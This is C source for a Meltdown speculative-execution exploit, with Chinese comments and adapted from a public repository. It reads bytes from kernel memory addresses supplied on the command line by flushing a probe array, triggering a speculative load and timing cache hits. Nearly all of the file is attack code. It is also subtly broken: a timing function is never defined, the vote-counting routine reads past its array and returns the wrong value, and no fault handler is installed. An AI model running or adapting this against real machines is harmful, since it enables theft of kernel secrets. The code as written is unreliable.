#define _GNU_SOURCE
#include <setjmp.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <x86intrin.h>

#define PAGESIZE 4096
#define CYCLES 1000 //对某个地址进行攻击的次数
#define VALUE_NUM 100 //一次攻击读出的数据数目的上限
#define MINTIME 1000
#define VARIANTS_READ 256


static char hist[ VARIANTS_READ*PAGESIZE ];



int  get_value(){  //获取被攻击地址的值
    //此代码是在https://github.com/paboldin/meltdown-exploit/blob/master/meltdown.c上略作改动
    int i, time, mix_i, min_pos, min_time = MINTIME;
    volatile char *addr;

    for (i = 0; i < VARIANTS_READ; i++ ){//找到数组中被加载到cache中的那一块

        mix_i=((i * 167) + 13) & 255;
        addr = &hist[PAGESIZE * mix_i];
        time = get_access_time( addr );

        if (min_time > time){
            min_time = time;
            min_pos= mix_i;
        }
    }
    return min_pos;

}



load_cache(char* addr)//将待获取的内核地址数据load到cache中

{   //此代码引用自https://github.com/paboldin/meltdown-exploit/blob/master/meltdown.c
    asm volatile (

        "1:\n\t"

        ".rept 300\n\t"
        "add $0x141, %%rax\n\t"
        ".endr\n\t"

        "movzx (%[addr]), %%eax\n\t"
        "shl $12, %%rax\n\t"
        "jz 1b\n\t"
        "mov (%[target], %%rax, 1), %%rbx\n"

        "stopspeculate: \n\t"
        "nop\n\t"
        :
        : [target] "r" (hist),
          [addr] "r" (addr)
        : "rax", "rbx"
    );
}



int attack(int fd, unsigned long addr){//对地址addr进行越权访问

    int i;
    static char buf[VARIANTS_READ];

    memset(hist, 1, sizeof(hist));
    ( void )pread(fd, buf, sizeof(buf), 0);

    for ( i = 0; i < VARIANTS_READ; i++)_mm_clflush( &hist[i*PAGESIZE] );//保证攻击前，数组hist不在cache中

    load_cache( addr );
    return get_value();

}


int ensure_value( int *score ){

    int p = 0, k = 0;
    for (; p < VARIANTS_READ; p++) k = (score[p]>score[k])? p : k;
    return score[ p ];

}


int main(int argc, const char* * argv){

    int fd, score[ VARIANTS_READ ], once;
    char value[ VALUE_NUM ];
    unsigned long addr, size ;

    sscanf(argv[1],"%lx",&addr);
    sscanf(argv[2],"%d",&size);

    fd = open("/proc/version", O_RDONLY);
    for (int j = 0; j < size; j++){

        memset(score,0,sizeof(score));
        for (int i = 0; i < CYCLES; i++ ){
            once = attack(fd, addr) ;
            score[ once ]++;
        }//对同一地址进行多次攻击，以保证结果的准确性
        value[ j ] = ensure_value( score );//认为得到次数最多的值作为被攻击地址下的确切值
        addr++;

    }
    close( fd );
    for(int j = 0; j < size; j++)putchar( value[ j ] );

}